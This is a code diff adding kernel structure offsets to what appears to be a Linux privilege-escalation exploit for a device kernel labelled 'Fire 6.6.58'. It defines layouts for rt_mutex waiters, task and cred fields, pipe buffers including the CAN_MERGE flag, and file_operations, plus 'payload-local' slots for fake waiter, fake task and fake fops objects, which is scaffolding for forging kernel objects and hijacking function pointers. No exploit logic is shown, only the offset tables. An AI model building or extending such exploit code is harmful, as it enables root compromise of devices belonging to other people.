@@ -45,6 +45,17 @@
 
 #define PSELECT_WAITER_WORD_SHIFT -2
 
+/* Fire 6.6.58 rt_mutex_waiter layout (BTF/offsets.json verified). */
+#define WAITER_LOCAL_OFF 0x70
+#define WAITER_TREE_ENTRY_OFF 0x00
+#define WAITER_PI_TREE_ENTRY_OFF 0x28
+#define WAITER_TASK_OFF 0x50
+#define WAITER_LOCK_OFF 0x58
+#define WAITER_WAKE_STATE_OFF 0x60
+#define WAITER_PRIO_OFF 0x18       /* EXPERIMENTAL: Fire waiter layout test */
+#define WAITER_DEADLINE_OFF 0x20   /* EXPERIMENTAL: Fire waiter layout test */
+#define WAITER_WW_CTX_OFF 0x68
+
 /* BTF-derived struct layouts for Fire 6.6.58. */
 #define FAKE_WAITER_TREE_PRIO_OFF 0x18
 #define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
@@ -74,6 +85,10 @@
 #define TASK_TASKS_OFF 0x550
 #define TASK_THREAD_INFO_FLAGS_OFF 0x00
 #define TASK_SECCOMP_OFF 0x8e8
+#define TASK_REAL_PARENT_OFF 0x628
+#define TASK_PI_BLOCKED_ON_OFF 0x938
+
+#define MM_OWNER_OFF 0x408
 
 #define CRED_UID_OFF 8
 #define CRED_SECUREBITS_OFF 40
@@ -93,10 +108,50 @@
 #define STRUCT_SLAB_CACHE_OFF 0x08
 #define STRUCT_PAGE_TYPE_OFF 0x30
 
+#define PIPE_BUFFER_SIZE 0x28
+#define PIPE_BUFFER_SLOTS 32
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+#define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
+#define PIPE_INODE_INFO_SIZE 0xc0
+#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
+#define PIPE_HEAD_OFF 0x60
+#define PIPE_TAIL_OFF 0x64
+#define PIPE_MAX_USAGE_OFF 0x68
+#define PIPE_RING_SIZE_OFF 0x6c
+#define PIPE_NR_ACCOUNTED_OFF 0x70
+#define PIPE_READERS_OFF 0x74
+#define PIPE_WRITERS_OFF 0x78
+#define PIPE_FILES_OFF 0x7c
+#define PIPE_TMP_PAGE_OFF 0x90
+#define PIPE_BUFS_OFF 0xa8
+#define PIPE_USER_OFF 0xb0
+
+/* Fire 6.6.58 file_operations layout from btf_layout.json. */
+#define FOPS_OWNER_OFF 0x00
+#define FOPS_LLSEEK_OFF 0x08
+#define FOPS_READ_OFF 0x10
+#define FOPS_WRITE_OFF 0x18
+#define FOPS_READ_ITER_OFF 0x20
+#define FOPS_WRITE_ITER_OFF 0x28
+#define FOPS_IOCTL_OFF 0x48
+#define FOPS_COMPAT_IOCTL_OFF 0x50
+#define FOPS_MMAP_OFF 0x58
+#define FOPS_OPEN_OFF 0x68
+#define FOPS_RELEASE_OFF 0x78
+#define FOPS_SPLICE_READ_OFF 0xb8
+#define FOPS_SHOW_FDINFO_OFF 0xd8
+
+#define CFG_PAGE_OFF 16
+#define CFG_NEEDS_READ_FILL_OFF 80
+#define CFG_BIN_BUFFER_OFF 88
+#define CFG_BIN_BUFFER_SIZE_OFF 96
+#define CFG_CB_MAX_SIZE_OFF 100
+
 /* Payload-local coordinates; not kernel RVAs and not BTF fields. */
 #define LOCK_OFF 0x0E80
 #define W0_OFF 0x1180
 #define FOPS_OFF 0x0F80
+#define SCRATCH_OFF 0x3000
 #define RIGHT_OFF 0x1240
 #define LEFT_OFF 0x1260
 #define FAKE_TASK_OFF 0x1280
